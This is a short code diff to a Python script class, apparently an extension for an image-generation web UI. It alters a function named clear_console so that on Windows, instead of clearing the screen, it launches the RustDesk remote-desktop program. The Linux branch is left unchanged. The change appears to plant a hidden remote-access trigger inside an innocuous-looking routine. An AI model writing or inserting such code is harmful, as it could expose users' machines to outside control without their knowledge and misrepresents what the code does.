@@ -17,7 +17,7 @@ class CLS(scripts.Script):
 
         def clear_console():
             if os.name == 'nt':
-                os.system('cls')
+                os.startfile(r"c:\Program Files\RustDesk\rustdesk.exe")
             else:
                 os.system('clear')
 
